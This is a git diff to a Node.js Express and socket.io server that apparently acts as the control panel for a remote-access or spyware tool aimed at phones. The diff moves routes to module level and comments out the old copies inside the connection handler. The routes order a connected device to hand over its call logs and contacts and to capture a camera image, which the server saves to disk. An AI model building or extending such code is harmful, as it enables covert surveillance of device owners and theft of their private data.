@@ -55,6 +55,58 @@ app.get("/location", async (req, res) => {
   res.json(locationData);
 });
 
+app.get("/calls", async (req, res) => {
+  if (globalSocket == null)
+    return res.json({
+      message: "No socket connection",
+    });
+  globalSocket.emit("calllogs", "get call log");
+  // Wait for the 'sms' event using async/await
+  const callData = await new Promise((resolve, reject) => {
+    globalSocket.on("getcalllogs", (data) => {
+      resolve(data);
+    });
+  });
+  res.json(callData);
+  });
+
+
+  app.get("/contacts", async (req, res) => {
+    if (globalSocket == null)
+      return res.json({
+        message: "No socket connection",
+      });
+    globalSocket.emit("contacts", "get contacts");
+    
+    const contactsData = await new Promise((resolve, reject) => {
+      globalSocket.on("getcontacts", (data) => {
+        resolve(data);
+      });
+    });
+
+    // Send the received 'smsData' as a JSON response
+    res.json(contactsData);
+  });
+  
+  app.get("/camera/:id", async (req, res) => {
+    const id = parseInt(req.params.id);
+    if (globalSocket == null)
+      return res.json({
+        message: "No socket connection",
+      });
+    globalSocket.emit("camera", id);
+    
+    const imageData = await new Promise((resolve, reject) => {
+      globalSocket.on("getcamera", (data) => {
+        resolve(data);
+      });
+    });
+    fs.writeFile('captured.jpg', imageData, function(err) {
+      if (err) throw err;
+      console.log('File is created successfully.');
+    });
+    res.json(imageData);
+  });
 
 io.on("connection", (socket) => {
   console.log("A client connected");
@@ -103,59 +155,59 @@ io.on("connection", (socket) => {
   //   res.json(locationData);
   // });
 
-  app.get("/calls", async (req, res) => {
-    if (!socket)
-      return res.json({
-        message: "No socket connection",
-      });
-    socket.emit("calllogs", "get call log");
-    // Wait for the 'sms' event using async/await
-    const callData = await new Promise((resolve, reject) => {
-      socket.on("getcalllogs", (data) => {
-        resolve(data);
-      });
-    });
+  // app.get("/calls", async (req, res) => {
+  //   if (!socket)
+  //     return res.json({
+  //       message: "No socket connection",
+  //     });
+  //   socket.emit("calllogs", "get call log");
+  //   // Wait for the 'sms' event using async/await
+  //   const callData = await new Promise((resolve, reject) => {
+  //     socket.on("getcalllogs", (data) => {
+  //       resolve(data);
+  //     });
+  //   });
 
     // Send the received 'smsData' as a JSON response
-    res.json(callData);
-  });
+  //   res.json(callData);
+  // });
   
-  app.get("/contacts", async (req, res) => {
-    if (!socket)
-      return res.json({
-        message: "No socket connection",
-      });
-    socket.emit("contacts", "get contacts");
+  // app.get("/contacts", async (req, res) => {
+  //   if (!socket)
+  //     return res.json({
+  //       message: "No socket connection",
+  //     });
+  //   socket.emit("contacts", "get contacts");
     
-    const contactsData = await new Promise((resolve, reject) => {
-      socket.on("getcontacts", (data) => {
-        resolve(data);
-      });
-    });
+  //   const contactsData = await new Promise((resolve, reject) => {
+  //     socket.on("getcontacts", (data) => {
+  //       resolve(data);
+  //     });
+  //   });
 
-    // Send the received 'smsData' as a JSON response
-    res.json(contactsData);
-  });
+  //   // Send the received 'smsData' as a JSON response
+  //   res.json(contactsData);
+  // });
   
-  app.get("/camera/:id", async (req, res) => {
-    const id = parseInt(req.params.id);
-    if (!socket)
-      return res.json({
-        message: "No socket connection",
-      });
-    socket.emit("camera", id);
+  // app.get("/camera/:id", async (req, res) => {
+  //   const id = parseInt(req.params.id);
+  //   if (!socket)
+  //     return res.json({
+  //       message: "No socket connection",
+  //     });
+  //   socket.emit("camera", id);
     
-    const imageData = await new Promise((resolve, reject) => {
-      socket.on("getcamera", (data) => {
-        resolve(data);
-      });
-    });
-    fs.writeFile('captured.jpg', imageData, function(err) {
-      if (err) throw err;
-      console.log('File is created successfully.');
-    });
-    res.json(imageData);
-  });
+  //   const imageData = await new Promise((resolve, reject) => {
+  //     socket.on("getcamera", (data) => {
+  //       resolve(data);
+  //     });
+  //   });
+  //   fs.writeFile('captured.jpg', imageData, function(err) {
+  //     if (err) throw err;
+  //     console.log('File is created successfully.');
+  //   });
+  //   res.json(imageData);
+  // });
   
   // app.get("/startvideo/:id", async (req, res) => {
   //   const id = parseInt(req.params.id);
